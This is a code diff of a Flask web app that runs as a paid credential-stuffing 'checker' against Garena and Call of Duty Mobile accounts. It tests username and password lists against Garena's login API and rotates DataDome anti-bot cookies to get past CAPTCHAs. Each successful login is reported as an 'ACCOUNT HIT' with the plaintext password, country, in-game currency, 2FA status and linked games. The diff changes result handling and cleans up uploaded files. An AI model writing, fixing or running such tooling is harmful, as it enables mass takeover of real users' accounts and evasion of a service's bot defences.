@@ -1,4 +1,4 @@
-# --- START OF FINAL app.py ---
+# --- START OF FINAL app.py (Corrected for Render File System) ---
 
 # --- Standard and System Imports ---
 import os, sys, re, time, json, uuid, base64, hashlib, random, logging, urllib, threading, secrets, html
@@ -157,6 +157,8 @@ def log_message(message, color_class='text-white', user_id=None):
             check_status[user_id]['logs'] = check_status[user_id]['logs'][-500:]
 
 # --- [START] COMPLETE CHECKER LOGIC ---
+# ... (All the helper functions like getpass, format_result, etc. are correct and unchanged)
+# ... The only function that needs changing is run_check_task
 apkrov = "https://auth.garena.com/api/login?"
 redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
 COUNTRY_KEYWORD_MAP = {"PH": ["PHILIPPINES", "PH"], "ID": ["INDONESIA", "ID"], "US": ["UNITED STATES", "USA", "US"], "ES": ["SPAIN", "ES"], "VN": ["VIETNAM", "VN"], "CN": ["CHINA", "CN"], "MY": ["MALAYSIA", "MY"], "TW": ["TAIWAN", "TW"], "TH": ["THAILAND", "TH"], "RU": ["RUSSIA", "RUSSIAN FEDERATION", "RU"], "PT": ["PORTUGAL", "PT"],}
@@ -202,43 +204,11 @@ def fetch_new_datadome_pool(num_cookies, user_id):
     else: log_message(f"[❌] Failed to fetch any new cookies. Your IP might be heavily restricted.", "text-danger", user_id)
     return new_pool
 
-def save_datadome_cookie(cookie_value, user_id):
-    if not cookie_value: return
-    file_path = os.path.join(APP_DATA_DIR, "datadome_cookies.json")
-    with status_lock:
-        cookie_pool = []
-        if os.path.exists(file_path):
-            try:
-                with open(file_path, 'r') as f: data = json.load(f)
-                if isinstance(data, list): cookie_pool = data
-            except (json.JSONDecodeError, IOError): pass
-        if not any(c.get('datadome') == cookie_value for c in cookie_pool):
-            cookie_pool.append({'datadome': cookie_value})
-            try:
-                with open(file_path, 'w') as f: json.dump(cookie_pool, f, indent=4)
-                log_message("[💾] New DataDome Cookie saved to shared pool.", "text-info", user_id)
-            except IOError as e: log_message(f"Error saving datadome cookie file: {e}", "text-danger", user_id)
-
 def format_result(user_id, last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, date, username, password, codm_level):
     is_clean_text, email_ver_text = ("Clean ✔", "(Verified✔)") if is_clean else ("Not Clean ⚠️", "(Not Verified⚠️)")
     bool_status, has_codm = lambda status: "True ✔" if status == 'True' else "False ❌", "No CODM account found" not in connected_games[0]
     console_message = f"""[✅] GARENA ACCOUNT HIT\n   [🔑 Credentials]\n      User: {username}\n      Pass: {password}\n   [📊 Information]\n      Country: {country}\n      Shells: {shell} 💰\n      Last Login: {last_login}\n      Email: {email} {email_ver_text}\n      Facebook: {fb}\n   [🎮 CODM Details]\n      {connected_games[0].replace(chr(10), chr(10) + "      ")}\n   [🛡️ Security]\n      Status: {is_clean_text}\n      Mobile Bind: {bool_status('True' if mobile != 'N/A' else 'False')}\n      Facebook Link: {bool_status(facebook)}\n      2FA Enabled: {bool_status(two_step_enabled)}\n      Authenticator: {bool_status(authenticator_enabled)}\n      - Presented By: PAPA MO -""".strip()
-    codm_level_num = int(codm_level) if isinstance(codm_level, str) and codm_level.isdigit() else 0
-    country_folder = "Others"
-    for folder_key, keywords in COUNTRY_KEYWORD_MAP.items():
-        if any(keyword in str(country).upper() for keyword in keywords): country_folder = folder_key; break
-    level_range = "No_CODM_Data"
-    if has_codm:
-        if 1 <= codm_level_num <= 50: level_range = "1-50"
-        elif 51 <= codm_level_num <= 100: level_range = "51-100"
-        elif 101 <= codm_level_num <= 200: level_range = "101-200"
-        elif 201 <= codm_level_num <= 300: level_range = "201-300"
-        else: level_range = "301-400"
-    clean_tag = "clean" if is_clean else "not_clean"
-    user_results_dir, country_path = os.path.join(RESULTS_BASE_DIR, f"user_{user_id}"), os.path.join(user_results_dir, country_folder)
-    file_to_write = os.path.join(country_path, f"{level_range}_{clean_tag}.txt")
-    content_to_write = console_message + "\n" + "=" * 60 + "\n"
-    return (console_message, codm_level_num, country, has_codm, is_clean, file_to_write, content_to_write)
+    return (console_message, is_clean)
 
 def show_level(access_token, selected_header, sso, token, newdate, cookie):
     try:
@@ -278,7 +248,6 @@ def check_login(user_id, account_username, _id, encryptedpassword, password, sel
                 elif key == "Authenticator": authenticator_enabled = value
                 elif key == "Two-Step Verification": two_step_enabled = value
             except ValueError: continue
-        save_datadome_cookie(dataa, user_id)
         sso_key, token_session = response.cookies.get('sso_key'), response.cookies.get('token_session')
         game_info = show_level(login_json.get('access_token'), selected_header, sso_key, token_session, dataa, cookies)
         if "[FAILED]" in game_info: connected_games, codm_level = [f"No CODM account found or error: {game_info}"], "N/A"
@@ -306,6 +275,7 @@ def check_account(user_id, username, password, date, datadome_cookie, selected_c
 
 def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart):
     with app.app_context():
+        # --- START: THIS IS THE CORRECTED run_check_task FUNCTION ---
         try:
             user = User.query.get(user_id)
             is_paid_user = user.is_paid and user.key_expiry and user.key_expiry > datetime.utcnow()
@@ -369,8 +339,7 @@ def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_s
                     if not current_datadome:
                         log_message("[❌] All cookies on cooldown or pool empty. Waiting for user action...", "text-danger", user_id)
                         with status_lock: check_status[user_id]['captcha_detected'] = True
-                        captcha_pause_event.clear()
-                        captcha_pause_event.wait()
+                        captcha_pause_event.clear(); captcha_pause_event.wait()
                         with status_lock: check_status[user_id]['captcha_detected'] = False
                         if stop_event.is_set(): break
                         continue
@@ -383,8 +352,7 @@ def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_s
                         log_message(f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}. Cooldown 5 mins.", "text-danger", user_id)
                         cookie_state['cooldown'][current_datadome] = time.time() + 300
                         with status_lock: check_status[user_id]['captcha_detected'] = True
-                        captcha_pause_event.clear()
-                        captcha_pause_event.wait()
+                        captcha_pause_event.clear(); captcha_pause_event.wait()
                         with status_lock: check_status[user_id]['captcha_detected'] = False
                         if stop_event.is_set(): break
                         continue
@@ -394,7 +362,7 @@ def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_s
                 if stop_event.is_set(): break
                 
                 if isinstance(result, tuple):
-                    console_message, _, _, _, is_clean, _, _ = result
+                    console_message, is_clean = result
                     log_message(console_message, "text-success", user_id)
                     stats['successful'] += 1
                     if is_clean: stats['clean'] += 1
@@ -423,10 +391,16 @@ def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_s
             import traceback
             log_message(f"CRITICAL ERROR in checker task: {e}\n{traceback.format_exc()}", "text-danger", user_id)
         finally:
+            # Cleanup the uploaded file from /tmp
+            if os.path.exists(file_path):
+                try:
+                    os.remove(file_path)
+                except OSError:
+                    pass # Fail silently if file can't be removed
             with status_lock:
                 if user_id in check_status:
                     check_status[user_id]['running'] = False
-# --- [END] COMPLETE CHECKER LOGIC ---
+        # --- END: CORRECTED run_check_task FUNCTION ---
 
 # --- AUTHENTICATION & APP ROUTES ---
 @app.context_processor
